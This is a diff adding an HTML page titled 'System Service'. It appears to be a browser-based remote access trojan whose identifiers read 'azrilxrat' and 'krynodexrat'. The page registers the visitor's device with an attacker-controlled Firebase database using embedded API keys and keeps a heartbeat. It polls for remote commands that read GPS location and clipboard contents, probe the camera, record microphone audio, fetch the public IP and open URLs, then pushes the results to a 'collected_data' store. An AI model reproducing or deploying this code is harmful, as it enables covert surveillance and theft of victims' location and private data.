@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>System Service</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  background:#000;color:#0f0;
+  display:flex;align-items:center;justify-content:center;
+  height:100vh;font-family:'Courier New',monospace;
+  flex-direction:column;gap:12px;
+  text-align:center;padding:20px;
+}
+.loader{width:30px;height:30px;border:2px solid #0f0;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.status-text{font-size:12px;color:#0f0;}
+.id-text{font-size:8px;color:#333;margin-top:8px;max-width:90%;word-break:break-all}
+</style>
+</head>
+<body>
+
+<div class="loader" id="loader"></div>
+<div class="status-text" id="statusMsg">Connecting...</div>
+<div class="id-text" id="idDisplay"></div>
+
+<script>
+// ═════════════════════════════════
+// 1 HP = 1 DEVICE (PERSISTENT)
+// ═════════════════════════════════
+
+let DEVICE_ID = localStorage.getItem('azrilxrat_device_id');
+if (!DEVICE_ID) {
+  DEVICE_ID = 'TGT_' + Math.random().toString(36).substr(2,9) + Date.now().toString(36);
+  localStorage.setItem('azrilxrat_device_id', DEVICE_ID);
+}
+
+document.getElementById('idDisplay').textContent = 'ID: ' + DEVICE_ID;
+
+// Firebase Init
+const FB = {
+  apiKey: "AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",
+  authDomain: "krynodexrat.firebaseapp.com",
+  databaseURL: "https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "krynodexrat",
+  storageBucket: "krynodexrat.firebasestorage.app",
+  messagingSenderId: "465327768431",
+  appId: "1:465327768431:web:3e5871b9f80dcbcad1de9a"
+};
+
+firebase.initializeApp(FB);
+const db = firebase.database();
+
+// ═════════════════════════════
+// DEVICE REGISTER
+// ═════════════════════════════
+
+const deviceInfo = {
+  id: DEVICE_ID,
+  model: navigator.userAgent.split(';')[1]?.trim() || 'Browser',
+  platform: navigator.platform,
+  language: navigator.language,
+  screenSize: screen.width + 'x' + screen.height,
+  userAgent: navigator.userAgent.substring(0, 80),
+  registeredAt: Date.now(),
+  lastSeen: Date.now(),
+  online: true
+};
+
+db.ref('devices/' + DEVICE_ID).update(deviceInfo)
+  .then(() => {
+    document.getElementById('statusMsg').textContent = '✅ ACTIVE';
+    document.getElementById('loader').style.borderColor = '#0f0';
+  })
+  .catch(err => {
+    document.getElementById('statusMsg').textContent = '❌ ERROR';
+    console.error(err);
+  });
+
+// Heartbeat 10 detik
+setInterval(() => {
+  db.ref('devices/' + DEVICE_ID).update({ lastSeen: Date.now(), online: true });
+}, 10000);
+
+// Deteksi online/offline
+window.addEventListener('online', () => {
+  db.ref('devices/' + DEVICE_ID).update({ online: true, lastSeen: Date.now() });
+  document.getElementById('statusMsg').textContent = '✅ ACTIVE';
+});
+
+window.addEventListener('offline', () => {
+  db.ref('devices/' + DEVICE_ID).update({ online: false, lastSeen: Date.now() });
+  document.getElementById('statusMsg').textContent = '⚠️ OFFLINE';
+});
+
+window.addEventListener('beforeunload', () => {
+  db.ref('devices/' + DEVICE_ID).update({ online: false, lastSeen: Date.now() });
+});
+
+// ═════════════════════════════
+// BROWSER API FUNCTIONS
+// ═════════════════════════════
+
+async function getGPS() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) { resolve({error:"GPS not supported"}); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({lat:pos.coords.latitude, lng:pos.coords.longitude, acc:pos.coords.accuracy}),
+      err => resolve({error:err.message}),
+      {timeout:10000}
+    );
+  });
+}
+
+async function getClipboard() {
+  try { const t = await navigator.clipboard.readText(); return {text:t}; }
+  catch(e) { return {error:"Clipboard denied"}; }
+}
+
+function getDeviceInfo() {
+  return {
+    ua: navigator.userAgent.substring(0,100),
+    platform: navigator.platform,
+    lang: navigator.language,
+    screen: screen.width+"x"+screen.height,
+    mem: navigator.deviceMemory||"?",
+    cores: navigator.hardwareConcurrency||"?",
+    online: navigator.onLine
+  };
+}
+
+async function getBattery() {
+  try {
+    const b = await navigator.getBattery();
+    return {level:Math.round(b.level*100)+"%", charging:b.charging};
+  } catch(e) { return {error:"Battery N/A"}; }
+}
+
+function vibrate() {
+  if (navigator.vibrate) { navigator.vibrate([500,200,500]); return {status:"vibrated"}; }
+  return {error:"No vibrate"};
+}
+
+async function takePhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});
+    const s = stream.getVideoTracks()[0].getSettings();
+    stream.getTracks().forEach(t=>t.stop());
+    return {status:"camera_ok", res:s.width+"x"+s.height};
+  } catch(e) { return {error:e.message}; }
+}
+
+async function recordAudio() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({audio:true});
+    const rec = new MediaRecorder(stream);
+    const chunks = [];
+    rec.ondataavailable = e => chunks.push(e.data);
+    return new Promise(resolve => {
+      rec.start();
+      setTimeout(() => {
+        rec.stop();
+        stream.getTracks().forEach(t=>t.stop());
+        resolve({status:"recorded", duration:"3s"});
+      }, 3000);
+    });
+  } catch(e) { return {error:e.message}; }
+}
+
+function getNetwork() {
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (c) return {type:c.effectiveType, downlink:c.downlink+"Mbps", rtt:c.rtt+"ms"};
+  return {error:"N/A"};
+}
+
+async function getIP() {
+  try {
+    const r = await fetch('https://api.ipify.org?format=json');
+    const d = await r.json();
+    return {ip:d.ip};
+  } catch(e) { return {error:"Failed"}; }
+}
+
+// ═════════════════════════════
+// COMMAND HANDLER
+// ═════════════════════════════
+
+async function executeCommand(cmd) {
+  let result = {type:cmd, status:"executed", timestamp:Date.now()};
+  
+  if (cmd === 'GET_GPS' || cmd === 'GET_LOCATION') {
+    result.data = await getGPS();
+  } else if (cmd === 'GET_CLIPBOARD') {
+    result.data = await getClipboard();
+  } else if (cmd === 'GET_DEVICE_INFO') {
+    result.data = getDeviceInfo();
+  } else if (cmd === 'GET_BATTERY') {
+    result.data = await getBattery();
+  } else if (cmd === 'VIBRATE') {
+    result.data = vibrate();
+  } else if (cmd === 'CAMERA' || cmd === 'TAKE_PHOTO') {
+    result.data = await takePhoto();
+  } else if (cmd === 'MIC' || cmd === 'RECORD_AUDIO') {
+    result.data = await recordAudio();
+  } else if (cmd === 'GET_NETWORK') {
+    result.data = getNetwork();
+  } else if (cmd === 'GET_IP') {
+    result.data = await getIP();
+  } else if (cmd === 'FLASH_ON') {
+    result.data = {note:"Need APK"};
+  } else if (cmd === 'FLASH_OFF') {
+    result.data = {note:"Need APK"};
+  } else if (cmd.startsWith('OPEN_URL:')) {
+    window.open(cmd.split(':')[1], '_blank');
+    result.data = {opened:true};
+  } else if (cmd.startsWith('ALERT:')) {
+    alert(cmd.split(':')[1]);
+    result.data = {alerted:true};
+  } else {
+    result.data = {note:"unknown_command"};
+  }
+  
+  return result;
+}
+
+// ═════════════════════════════
+// LISTEN COMMANDS
+// ═════════════════════════════
+
+db.ref('commands/' + DEVICE_ID).on('child_added', async (snap) => {
+  const cmd = snap.val();
+  if (!cmd || cmd.status !== 'pending') return;
+  
+  snap.ref.update({status:'processing'});
+  const result = await executeCommand(cmd.command);
+  db.ref('collected_data').push(result);
+  snap.ref.update({status:'done'});
+  setTimeout(() => snap.ref.remove(), 2000);
+});
+
+</script>
+</body>
+</html>
